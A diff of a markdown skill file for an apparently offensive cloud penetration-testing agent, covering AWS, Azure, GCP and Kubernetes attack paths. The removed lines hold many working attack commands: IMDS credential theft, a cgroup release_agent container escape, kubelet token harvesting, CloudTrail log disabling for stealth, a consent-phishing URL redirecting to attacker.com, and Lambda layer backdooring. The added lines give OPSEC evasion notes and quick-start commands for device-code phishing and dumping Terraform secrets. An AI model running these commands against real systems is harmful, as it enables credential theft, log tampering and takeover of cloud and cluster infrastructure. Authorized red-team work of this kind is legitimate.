@@ -1,462 +1,119 @@
 ---
 name: cloud-security
-description: Cloud penetration testing — AWS/Azure/GCP privilege escalation, container escape, Kubernetes attacks, serverless exploitation, IaC misconfigurations
+description: Cloud attack paths across AWS/Azure/GCP — IAM/identity privilege escalation, IMDS/metadata SSRF, Entra device-code & PRT theft, GCP impersonation chains, Kubernetes/container escape, and IaC/CI-CD federation abuse
 metadata:
   type: offensive
   phase: exploitation
-  tools: pacu, prowler, scoutsuite, trivy, kubectl, aws-cli, az-cli, gcloud, cloudfox, peirates
+  tools: pacu, cloudfox, scoutsuite, prowler, trivy, kubectl, aws-cli, az-cli, gcloud, peirates, mkat, azurehound, roadtools, stratus-red-team, kube-bench
+  mitre: [T1078.004, T1552.005, T1098.001, T1528, T1611, T1548]
 kill_chain:
   phase: [recon, exploit]
   step: [1, 4]
-  attck_tactics: [TA0043, TA0002, TA0004]
+  attck_tactics: [TA0043, TA0001, TA0004, TA0008, TA0006]
+  attck_techniques: [T1078.004, T1552.005, T1552.007, T1098.001, T1098.003, T1528, T1606.002, T1611, T1610, T1134.001, T1548, T1538]
 depends_on: [recon-osint]
-feeds_into: [exploit-development]
-inputs: [cloud_config, iam_policies]
-outputs: [cloud_misconfig_list, finding_record, attack_path]
+feeds_into: [exploit-development, active-directory-attack, advanced-redteam]
+inputs: [cloud_config, iam_policies, kubeconfig, ci_cd_config]
+outputs: [cloud_misconfig_list, finding_record, attack_path, stolen_credentials]
+references:
+  - references/aws-iam-privesc.md
+  - references/imds-metadata-ssrf.md
+  - references/azure-entra-attacks.md
+  - references/gcp-attacks.md
+  - references/kubernetes-container-escape.md
+  - references/iac-secrets-ci-cd.md
+scripts:
+  - scripts/aws_privesc_enum.py
+  - scripts/imds_harvester.py
+  - scripts/entra_device_code_phish.py
+  - scripts/gcp_impersonation_mapper.py
+  - scripts/k8s_can_i_abuse.py
+  - scripts/oidc_trust_auditor.py
 ---
 
 # Cloud Security & Attack
 
 ## When to Activate
 
-- Cloud infrastructure penetration testing
-- AWS/Azure/GCP privilege escalation
-- Container and Kubernetes security assessment
-- Serverless function exploitation
-- IaC (Terraform/CloudFormation) security review
-- Cloud credential abuse and lateral movement
+- Cloud penetration test / red team against AWS, Azure (Entra ID), or GCP
+- IAM / identity privilege escalation and cross-account or cross-tenant pivoting
+- Compromised web app or SSRF reachable from cloud compute — harvest metadata credentials
+- Kubernetes / container assessment, node breakout, cluster takeover
+- CI/CD and IaC review: Terraform state, OIDC federation trust policies, pipeline secrets
+- Post-exploitation: secret extraction, lateral movement, persistence in cloud control plane
 
-## AWS Attacks
+## Technique Map
 
-### Initial Enumeration
-```bash
-# Caller identity
-aws sts get-caller-identity
+| Technique | ATT&CK | CWE | Reference | Script |
+|-----------|--------|-----|-----------|--------|
+| AWS IAM privesc (CreatePolicyVersion, PassRole, AttachPolicy) | T1098.001 | CWE-269 | references/aws-iam-privesc.md | scripts/aws_privesc_enum.py |
+| AWS `sts:AssumeRoot` member-account escalation | T1078.004 | CWE-269 | references/aws-iam-privesc.md | scripts/aws_privesc_enum.py |
+| Cross-account confused deputy / missing ExternalId | T1078.004 | CWE-441 | references/aws-iam-privesc.md | scripts/oidc_trust_auditor.py |
+| IMDS / metadata SSRF credential theft (AWS/Azure/GCP) | T1552.005 | CWE-918 | references/imds-metadata-ssrf.md | scripts/imds_harvester.py |
+| EKS node creds → IRSA / Pod Identity pivot | T1552.007 | CWE-668 | references/imds-metadata-ssrf.md | scripts/imds_harvester.py |
+| Entra device-code phishing → PRT / device join | T1528 | CWE-287 | references/azure-entra-attacks.md | scripts/entra_device_code_phish.py |
+| FOCI refresh-token family abuse | T1550.001 | CWE-613 | references/azure-entra-attacks.md | scripts/entra_device_code_phish.py |
+| Azure Managed Identity / App-Admin → SP escalation | T1098.001 | CWE-269 | references/azure-entra-attacks.md | scripts/imds_harvester.py |
+| GCP `actAs` + resource create impersonation chain | T1078.004 | CWE-269 | references/gcp-attacks.md | scripts/gcp_impersonation_mapper.py |
+| GCP `serviceAccountTokenCreator` token chains | T1528 | CWE-269 | references/gcp-attacks.md | scripts/gcp_impersonation_mapper.py |
+| Vertex AI P4SA / Ray head-node escalation | T1078.004 | CWE-732 | references/gcp-attacks.md | scripts/gcp_impersonation_mapper.py |
+| Container escape (runc Leaky Vessels CVE-2024-21626) | T1611 | CWE-668 | references/kubernetes-container-escape.md | - |
+| IngressNightmare (CVE-2025-1974) cluster takeover | T1190 | CWE-94 | references/kubernetes-container-escape.md | scripts/k8s_can_i_abuse.py |
+| K8s RBAC privesc (pods/exec, token mount, node proxy) | T1078 | CWE-269 | references/kubernetes-container-escape.md | scripts/k8s_can_i_abuse.py |
+| Terraform state secret extraction | T1552.001 | CWE-312 | references/iac-secrets-ci-cd.md | scripts/oidc_trust_auditor.py |
+| OIDC federation trust-policy abuse (GitHub/TF Cloud) | T1199 | CWE-441 | references/iac-secrets-ci-cd.md | scripts/oidc_trust_auditor.py |
 
-# Account enumeration
-aws iam list-users
-aws iam list-roles
-aws iam list-policies --only-attached
-aws iam get-account-authorization-details  # full dump
-
-# S3 enumeration
-aws s3 ls
-aws s3 ls s3://bucket-name --recursive
-aws s3api get-bucket-acl --bucket bucket-name
-aws s3api get-bucket-policy --bucket bucket-name
-
-# EC2
-aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,State.Name,PublicIpAddress,IamInstanceProfile.Arn]'
-
-# Lambda
-aws lambda list-functions
-aws lambda get-function --function-name NAME  # includes download link
-aws lambda get-policy --function-name NAME
-```
-
-### Privilege Escalation
-```bash
-# Pacu (automated AWS exploitation)
-pacu
-> import_keys --all
-> run iam__enum_permissions
-> run iam__privesc_scan
-> run iam__bruteforce_permissions
-
-# Common privesc paths:
-# iam:CreatePolicyVersion → create admin policy version
-# iam:SetDefaultPolicyVersion → activate old permissive version
-# iam:AttachUserPolicy → attach AdministratorAccess
-# iam:CreateLoginProfile → create console password for any user
-# iam:UpdateLoginProfile → change any user's password
-# iam:PassRole + lambda:CreateFunction → create Lambda with admin role
-# iam:PassRole + ec2:RunInstances → launch EC2 with admin role
-# sts:AssumeRole → assume cross-account admin role
-# lambda:UpdateFunctionCode → inject code into existing Lambda
-
-# SSRF to IMDS
-curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
-curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
-# Returns: AccessKeyId, SecretAccessKey, Token
-```
-
-### Post-Exploitation
-```bash
-# Secrets Manager / Parameter Store
-aws secretsmanager list-secrets
-aws secretsmanager get-secret-value --secret-id NAME
-aws ssm get-parameters-by-path --path "/" --recursive --with-decryption
-
-# RDS snapshots (public)
-aws rds describe-db-snapshots --snapshot-type public
-
-# CloudTrail disruption (stealth)
-aws cloudtrail describe-trails
-aws cloudtrail stop-logging --name trail-name  # LOUD but effective
-# Better: use regions without CloudTrail, or use API calls that aren't logged
-```
-
-## Azure Attacks
-
-### Enumeration
-```bash
-# Azure AD enumeration
-az ad user list
-az ad group list
-az ad app list
-az role assignment list --all
-
-# Resource enumeration
-az resource list
-az vm list
-az storage account list
-az keyvault list
-
-# Token from IMDS
-curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
-```
-
-### Privilege Escalation
-```bash
-# Managed Identity abuse
-# Any Azure resource with MI can request tokens for other services
-
-# Automation Account RunAs
-# Extract certificate → authenticate as service principal
-
-# Key Vault access
-az keyvault secret list --vault-name VAULT
-az keyvault secret show --vault-name VAULT --name SECRET
-
-# Azure AD Connect (on-prem sync)
-# Extract credentials from ADSync database → DCSync
-
-# Consent grant attack
-# Illicit consent: trick admin into granting app permissions
-# Application with Mail.Read, Files.ReadWrite.All
-```
-
-## GCP Attacks
+## Quick Start
 
 ```bash
-# Service account enumeration
-gcloud iam service-accounts list
-gcloud projects get-iam-policy PROJECT_ID
+# --- 0. Identify where you are ---
+aws sts get-caller-identity                       # AWS
+az account show && az ad signed-in-user show      # Azure
+gcloud auth list && gcloud config get-value project  # GCP
 
-# Metadata server
-curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+# --- 1. AWS: enumerate then map privesc paths ---
+python3 scripts/aws_privesc_enum.py --profile compromised --json paths.json
+cloudfox aws --profile compromised all-checks      # alt: broad inventory
+pacu  # > run iam__enum_permissions ; run iam__privesc_scan
 
-# Privilege escalation
-# iam.serviceAccountKeys.create → create key for any SA
-# iam.serviceAccounts.actAs → impersonate service account
-# compute.instances.setMetadata → add SSH key to any VM
-# deploymentmanager.deployments.create → deploy as project editor
+# --- 2. SSRF / metadata: harvest creds from a reachable compute target ---
+python3 scripts/imds_harvester.py --ssrf "https://app/fetch?url=" --provider aws
+python3 scripts/imds_harvester.py --local --provider azure --resource https://vault.azure.net/
 
-# Storage bucket enumeration
-gsutil ls
-gsutil ls gs://bucket-name
-gsutil cp gs://bucket-name/secret.txt .
+# --- 3. Azure Entra: device-code phish for tokens (authorized phishing only) ---
+python3 scripts/entra_device_code_phish.py --resource https://graph.microsoft.com \
+    --client-id 29d9ed98-a469-4536-ade2-f981bc1d605e   # Auth Broker -> PRT path
+
+# --- 4. GCP: build the service-account impersonation graph ---
+python3 scripts/gcp_impersonation_mapper.py --project TARGET --out gcp_graph.json
+
+# --- 5. Kubernetes: what can this token do, and can we break out? ---
+python3 scripts/k8s_can_i_abuse.py --kubeconfig ./kubeconfig
+kubectl auth can-i --list ; peirates
+
+# --- 6. CI/CD + IaC: audit federation trust + dump state secrets ---
+python3 scripts/oidc_trust_auditor.py --profile compromised
+aws s3 cp s3://tf-state/prod/terraform.tfstate - | jq '.. | .password? // empty'
 ```
 
-## Kubernetes Attacks
+## OPSEC & Detection (summary)
 
-### Enumeration
-```bash
-# Check permissions
-kubectl auth can-i --list
-kubectl get secrets --all-namespaces
-kubectl get pods --all-namespaces
+| Technique | Telemetry / IOC | Detection (Sigma / EDR / cloud) | OPSEC note |
+|-----------|-----------------|---------------------------------|------------|
+| IAM privesc API calls | CloudTrail `CreatePolicyVersion`, `AttachUserPolicy`, `CreateLoginProfile` | Alert on IAM write by non-IAM-admin principal; GuardDuty `PrivilegeEscalation:IAMUser/*` | Use existing admin sessions; avoid bulk enum that trips anomaly detection |
+| `sts:AssumeRoot` | CloudTrail `AssumeRoot` (regional only) | Elastic "AssumeRoot by Rare User and Member Account" (new-terms rule) | Rare-event detection fires on first use per (principal, member account) |
+| IMDS SSRF | VPC flow to 169.254.169.254 from web tier; STS use from new ASN | GuardDuty `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration*` (creds used off-instance) | Use creds from same egress IP where possible; creds expire — refresh fast |
+| Entra device-code phish | Sign-in logs `authenticationProtocol=deviceCode`; Auth Broker client `29d9ed98-...`; new device registration | Sentinel device-code anomaly; CA "block device code flow" | Tokens valid even after password reset; device-join = MFA-resistant persistence |
+| GCP impersonation | `GenerateAccessToken` / `generateAccessToken` in Admin Activity + Data Access logs | Alert on impersonation by principal lacking a documented chain | Requires Data Access (`DATA_READ`) audit logs enabled to see token minting |
+| Container escape (runc) | New process from `/proc/self/fd/*` cwd; host binary writes; `nsenter` in container | Falco `Container escape`/`Drop and execute new binary`; runc ≤1.1.11 inventory | Overwrites host runc → noisy; prefer read-only host FS read for stealth |
+| IngressNightmare | NGINX ingress pod loads `.so` from `/proc`; outbound from controller | Falco/Sysdig "IngressNightmare" shared-lib load; ingress-nginx < 1.11.5/1.12.1 | Exploit hits admission webhook (often internal-only) — low external noise |
+| OIDC trust abuse | CloudTrail `AssumeRoleWithWebIdentity` from unexpected `sub`/repo | Alert on web-identity assume with mismatched `aud`/`sub`; RCP block | Wildcard `sub` (`org:foo*`) still exploitable; no creds needed |
 
-# Service account token
-cat /var/run/secrets/kubernetes.io/serviceaccount/token
-# Use with: kubectl --token=$TOKEN --server=https://kubernetes.default.svc
+## Deep Dives
 
-# API server direct
-curl -k https://kubernetes.default.svc/api/v1/namespaces/default/secrets \
-  -H "Authorization: Bearer $TOKEN"
-```
-
-### Exploitation
-```bash
-# Privileged pod escape
-# If privileged: mount host filesystem
-nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
-
-# Pod with hostPID/hostNetwork
-# Access host processes, network stack
-
-# Writable hostPath mount
-# Write to /etc/cron.d/ on host
-
-# Peirates (k8s pentesting tool)
-peirates
-> get-secrets
-> attack-mount-host-filesystem
-```
-
-### Container Escape
-```bash
-# Docker socket mounted
-docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host
-
-# Privileged container
-mount /dev/sda1 /mnt
-chroot /mnt
-
-# CVE-based escapes
-# CVE-2019-5736 (runc) — overwrite host runc binary
-# CVE-2020-15257 (containerd) — abstract socket access
-# CVE-2022-0185 — file_system_context heap overflow
-```
-
-## IaC Security Review
-
-### Terraform Misconfigurations
-```hcl
-# Dangerous patterns to flag:
-# - Security groups with 0.0.0.0/0 ingress
-# - S3 buckets without encryption or public access block
-# - IAM policies with "*" actions/resources
-# - RDS instances publicly accessible
-# - CloudTrail logging disabled
-# - KMS keys without rotation
-# - Lambda functions with admin roles
-```
-
-### Tools
-```bash
-# Automated scanning
-prowler aws --severity critical high
-scoutsuite aws
-trivy config ./terraform/
-checkov -d ./terraform/
-tfsec ./terraform/
-```
-
-## Advanced: AWS Exploitation Chains
-
-### IMDSv2 Bypass
-```bash
-# IMDSv2 requires PUT with hop limit=1 — bypass via SSRF in same host
-# If SSRF target is on same EC2, hop limit doesn't decrement
-TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
-curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
-
-# DNS rebinding to bypass IMDSv2 hop limit from external SSRF
-# Attacker DNS resolves to target IP first, then 169.254.169.254
-# Browser/HTTP client reuses connection → bypasses hop limit
-```
-
-### Lambda → IAM Role Chaining
-```bash
-# Lambda function with iam:PassRole + lambda:CreateFunction
-# Create new Lambda with more privileged role
-aws lambda create-function \
-  --function-name escalate \
-  --runtime python3.11 \
-  --role arn:aws:iam::ACCOUNT:role/AdminRole \
-  --handler index.handler \
-  --zip-file fileb://payload.zip
-
-# Lambda → STS → Cross-account assume
-aws sts assume-role --role-arn arn:aws:iam::TARGET_ACCOUNT:role/CrossAccountRole \
-  --role-session-name pwned
-```
-
-### S3 Confused Deputy
-```bash
-# Service principal confused deputy via s3:PutBucketPolicy
-# Trick AWS service into accessing bucket on your behalf
-# Exploit: create bucket with same name as expected by service
-# Service writes sensitive data to attacker-controlled bucket
-
-# S3 bucket takeover via dangling CNAME
-# 1. Find CNAME pointing to deleted S3 bucket
-# 2. Create bucket with same name in any region
-# 3. Serve malicious content on victim's subdomain
-dig +short subdomain.target.com CNAME
-# Returns: target-bucket.s3.amazonaws.com (NoSuchBucket)
-aws s3 mb s3://target-bucket
-```
-
-### CloudFormation/Terraform State Exploitation
-```bash
-# Terraform state file contains all secrets in plaintext
-aws s3 cp s3://terraform-state-bucket/prod/terraform.tfstate .
-cat terraform.tfstate | jq '.resources[].instances[].attributes | select(.password != null)'
-
-# CloudFormation exports (cross-stack references)
-aws cloudformation list-exports
-# Often contains VPC IDs, subnet IDs, security group IDs, RDS endpoints
-```
-
-### Cognito Identity Pool Misconfiguration
-```bash
-# Unauthenticated role assumption via misconfigured identity pool
-aws cognito-identity get-id --identity-pool-id REGION:POOL_ID
-aws cognito-identity get-credentials-for-identity --identity-id REGION:ID
-# Returns temporary credentials — check what IAM role allows
-```
-
-## Advanced: Azure/Entra ID Attack Paths
-
-### Azure AD Connect Exploitation
-```powershell
-# Extract credentials from ADSync database (requires local admin on AADConnect server)
-# Method 1: Direct DB query
-sqlcmd -S "(localdb)\.\ADSync" -Q "SELECT private_key_xml, machine_key FROM mms_server_configuration"
-
-# Method 2: AADInternals
-Install-Module AADInternals
-Get-AADIntSyncCredentials
-# Returns: domain admin credentials used for sync
-
-# Method 3: DCSync with extracted creds
-impacket-secretsdump -just-dc domain/MSOL_USER:PASSWORD@DC_IP
-```
-
-### Managed Identity Token Theft
-```bash
-# From compromised Azure VM/App Service/Function
-# System-assigned MI
-curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
-curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/"
-curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/"
-
-# Use token to enumerate and pivot
-az login --identity
-az role assignment list --all --query "[?principalId=='MI_OBJECT_ID']"
-```
-
-### Illicit Consent Grant
-```
-# 1. Register multi-tenant app with dangerous permissions
-#    - Mail.Read, Files.ReadWrite.All, User.Read.All
-# 2. Send phishing link to admin:
-https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
-  client_id=ATTACKER_APP_ID&
-  response_type=code&
-  redirect_uri=https://attacker.com/callback&
-  scope=https://graph.microsoft.com/.default&
-  prompt=consent
-# 3. Admin grants consent → attacker has persistent access to tenant data
-```
-
-### Service Principal Certificate Auth
-```bash
-# If you can read Key Vault or find .pfx file
-# Authenticate as service principal without password
-az login --service-principal -u APP_ID -p certificate.pem --tenant TENANT_ID
-
-# Or via MSAL
-from msal import ConfidentialClientApplication
-app = ConfidentialClientApplication(APP_ID, authority=f"https://login.microsoftonline.com/{TENANT}",
-  client_credential={"private_key": open("key.pem").read(), "thumbprint": THUMBPRINT})
-token = app.acquire_token_for_client(scopes=["https://graph.microsoft.com/.default"])
-```
-
-## Advanced: Kubernetes Exploitation
-
-### Pod Escape via /proc
-```bash
-# From container with hostPID=true
-# Find host process, access its root filesystem
-ls /proc/1/root/  # host filesystem via PID 1 (init)
-cat /proc/1/root/etc/shadow
-chroot /proc/1/root /bin/bash
-
-# From container with CAP_SYS_PTRACE
-# Inject into host process
-nsenter -t 1 -m -u -i -n -p -- /bin/bash
-```
-
-### Kubelet API Exploitation (10250/tcp)
-```bash
-# Unauthenticated kubelet API
-# List pods
-curl -sk https://NODE_IP:10250/pods | jq '.items[].metadata.name'
-
-# Execute commands in any pod
-curl -sk https://NODE_IP:10250/run/NAMESPACE/POD/CONTAINER -d "cmd=id"
-
-# Get service account tokens from all pods
-for pod in $(curl -sk https://NODE_IP:10250/pods | jq -r '.items[].metadata.name'); do
-  curl -sk "https://NODE_IP:10250/run/default/$pod/app" -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
-done
-```
-
-### etcd Direct Access
-```bash
-# If etcd is exposed (2379/tcp) without auth
-ETCDCTL_API=3 etcdctl --endpoints=http://ETCD_IP:2379 get / --prefix --keys-only
-# Get all secrets
-ETCDCTL_API=3 etcdctl --endpoints=http://ETCD_IP:2379 get /registry/secrets --prefix
-```
-
-### Container Escape Techniques
-```bash
-# CVE-2024-21626 (runc process.cwd breakout)
-# Exploit: set working directory to /proc/self/fd/N pointing to host
-# Requires: ability to create container with specific cwd
-
-# cgroup escape (notify_on_release)
-mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
-echo 1 > /tmp/cgrp/x/notify_on_release
-host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
-echo "$host_path/cmd" > /tmp/cgrp/release_agent
-echo '#!/bin/sh' > /cmd && echo "id > /output" >> /cmd && chmod +x /cmd
-sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
-cat /output
-
-# OverlayFS escape (requires CAP_SYS_ADMIN)
-unshare -m -p --fork /bin/bash
-mount -t overlay overlay -o lowerdir=/,upperdir=/tmp/upper,workdir=/tmp/work /mnt
-# /mnt now has full host filesystem
-```
-
-## Advanced: Serverless Exploitation
-
-### Lambda Environment Variable Extraction
-```bash
-# Lambda env vars often contain secrets
-aws lambda get-function-configuration --function-name TARGET \
-  --query 'Environment.Variables'
-# Common secrets: DB_PASSWORD, API_KEY, JWT_SECRET, AWS_ACCESS_KEY_ID
-
-# From inside Lambda execution
-env | grep -i key
-env | grep -i secret
-env | grep -i password
-cat /proc/self/environ | tr '\0' '\n'
-```
-
-### Event Injection
-```bash
-# S3 trigger manipulation — upload file that triggers Lambda with malicious event
-aws s3 cp malicious.json s3://trigger-bucket/
-# Lambda processes file content as trusted input → injection
-
-# SNS/SQS poisoning
-aws sqs send-message --queue-url QUEUE_URL \
-  --message-body '{"action":"delete","target":"*"}' 
-# If Lambda trusts message content without validation → arbitrary actions
-
-# API Gateway event injection
-# Manipulate headers/query params that become Lambda event fields
-curl -H "X-Forwarded-For: 127.0.0.1" \
-     -H "X-Original-URL: /admin" \
-     https://api-gw.execute-api.region.amazonaws.com/prod/endpoint
-```
-
-### Lambda Layer Poisoning
-```bash
-# Shared Lambda layers — if you can publish a layer version
-# Inject backdoor into commonly-used layer
-aws lambda publish-layer-version \
-  --layer-name common-utils \
-  --zip-file fileb://backdoored-layer.zip \
-  --compatible-runtimes python3.11
-
-# All functions using this layer now execute backdoor code
-# Layer code runs before function handler
-```
+- **references/aws-iam-privesc.md** — Classic + 2024 IAM escalation chains, `sts:AssumeRoot`, cross-account confused deputy / ExternalId, Cognito, secrets harvesting; detection per API.
+- **references/imds-metadata-ssrf.md** — IMDSv1/v2 mechanics, SSRF bypasses, Azure & GCP metadata token theft, EKS node-cred → IRSA/Pod Identity lateral movement.
+- **references/azure-entra-attacks.md** — Storm-2372 device-code → PRT → device-join chain, FOCI token families, Managed Identity abuse, Application Administrator → service principal → Global Admin.
+- **references/gcp-attacks.md** — `actAs` + resource-create impersonation, `serviceAccountTokenCreator` chains, Cloud Functions takeover, Vertex AI ModeLeak/P4SA/Ray escalation.
+- **references/kubernetes-container-escape.md** — runc Leaky Vessels (CVE-2024-21626), privileged/hostPID/Docker-socket escapes, IngressNightmare (CVE-2025-1974), RBAC primitives, kubelet/etcd.
+- **references/iac-secrets-ci-cd.md** — Terraform state secret extraction, OIDC federation trust-policy abuse (GitHub Actions / Terraform Cloud), pipeline secret theft, RCP/SCP defenses.
